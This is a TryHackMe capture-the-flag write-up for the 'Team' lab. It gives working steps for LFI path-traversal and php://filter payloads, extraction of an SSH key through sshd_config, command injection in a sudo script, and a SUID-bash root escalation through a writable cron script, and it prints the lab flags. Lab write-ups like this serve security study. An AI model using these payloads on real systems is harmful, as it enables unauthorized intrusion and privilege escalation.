# Team — TryHackMe Write-up

**Difficulty:** Easy  
**Date:** 2026-04-10  
**Author:** XENOS  
**Platform:** TryHackMe  

---

## Summary

A web server exposes a PHP file inclusion vulnerability with zero filtering, allowing us to read sensitive files via LFI. We extract an SSH private key from the server's SSH config file, log in as Dale, exploit a command injection vulnerability in a sudo-permitted script to pivot to Gyles, then abuse writable group permissions on a root-owned backup script to escalate to root.

**Attack Chain:**
```
LFI → sshd_config → id_rsa → SSH as Dale → Command Injection → Gyles → Writable Script → root
```

---

## Reconnaissance

```bash
sudo nmap -sCV -O -T4 -Pn 10.48.174.148 -o nmap-result.nmap
```

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.5 |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | Apache 2.4.41 |

**FTP Anonymous login:** Failed.

---

## Enumeration

The Apache default page contained a hint in its title:

```
add 'team.thm' to your hosts
```

Added `team.thm` to `/etc/hosts` and browsed to the site. Found `dale` in `/robots.txt` — a potential username.

### Subdomain Enumeration

```bash
ffuf -w ~/wordlists/SecLists/Discovery/DNS/namelist.txt \
     -H "Host: FUZZ.team.thm" \
     -u http://team.thm \
     -fs 11366
```

Discovered: `dev.team.thm` — added to `/etc/hosts`.

---

## Exploitation — Local File Inclusion (LFI)

`dev.team.thm` served a PHP page with a suspicious parameter:

```
http://dev.team.thm/script.php?page=teamshare.php
```

Tested path traversal to escape the web root:

```
http://dev.team.thm/script.php?page=../../../../etc/passwd
```

**Success.** The `page` parameter passes user input directly to PHP's `include()` with no filtering whatsoever.

### Reading the Source Code via PHP Filter

To read `script.php` itself without executing it, I used a PHP filter wrapper that base64-encodes the file before inclusion:

```
http://dev.team.thm/script.php?page=php://filter/convert.base64-encode/resource=script.php
```

Decoded output confirmed the vulnerability:

```php
<?php
$file = $_GET['page'];
if(isset($file)) { include("$file"); }
else { include("teamshare.php"); }
?>
```

No sanitization, no allowlist, no filtering — clean LFI.

### User Flag

```
http://dev.team.thm/script.php?page=../../../../home/dale/user.txt
```

```
THM{6Y0TXHz7c2d}
```

---

## Initial Access — SSH as Dale

Attempted to read Dale's private key directly:

```
http://dev.team.thm/script.php?page=../../../../home/dale/.ssh/id_rsa
```

Failed — either the file doesn't exist at that path or permissions blocked it.

**Alternative approach:** Read `/etc/ssh/sshd_config`. This file is world-readable by design and often reveals non-standard key paths configured by the admin:

```
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

Found Dale's private key path inside the config. Extracted the key, removed formatting artifacts, and saved it:

```bash
chmod 600 dale.rsa
ssh -i dale.rsa dale@team.thm
```

Logged in as Dale.

---

## Privilege Escalation — Dale → Gyles

```bash
sudo -l
```

```
(gyles) NOPASSWD: /home/gyles/admin_checks
```

Dale can run `/home/gyles/admin_checks` as Gyles without a password. Inspected the script:

```bash
#!/bin/bash
printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
```

**Vulnerability:** The script reads user input into `$error` then executes it directly as a shell command with no validation. This is an **unsanitized command injection via `read`**.

Since the script runs as Gyles, any command we inject executes with Gyles' privileges:

```bash
sudo -u gyles /home/gyles/admin_checks
# Enter name: obada
# Enter 'date': /bin/bash
```

Got a shell as Gyles.

---

## Privilege Escalation — Gyles → root

```bash
id
# uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),108(lxd),1003(editors),1004(admin)
```

Gyles is a member of the `admin` group. Searched for files owned by that group:

```bash
find / -group admin 2>/dev/null
```

```
/usr/local/bin
/usr/local/bin/main_backup.sh
/opt/admin_stuff
```

```bash
ls -la /usr/local/bin/main_backup.sh
# -rwxrwxr-x 1 root admin 65 Jan 17 2021 /usr/local/bin/main_backup.sh

cat /usr/local/bin/main_backup.sh
# #!/bin/bash
# cp -r /var/www/team.thm/* /var/backups/www/team.thm/
```

The script is **owned by root** but **writable by the admin group**. Since it runs as root (via cron), anything we append to it will execute as root.

Appended a command to set the SUID bit on `/bin/bash`:

```bash
echo 'chmod +s /bin/bash' >> /usr/local/bin/main_backup.sh
```

Once the script executed as root, `/bin/bash` became SUID. Spawned a root shell:

```bash
bash -p
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

```
THM{fhqbznavfonq}
```

---

## Lessons Learned

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| LFI (no input filtering) | `script.php?page=` | Read arbitrary files |
| Sensitive file exposure | `/etc/ssh/sshd_config` | Leaked private key path |
| Command injection | `admin_checks` read variable | Lateral movement to Gyles |
| Writable root-owned script | `main_backup.sh` | Full root compromise |

---

## Tools Used

- `nmap` — port scanning
- `ffuf` — subdomain enumeration
- `curl` / browser — LFI exploitation
- `ssh` — initial access
- `linpeas` — local enumeration
- `bash -p` — SUID privilege escalation
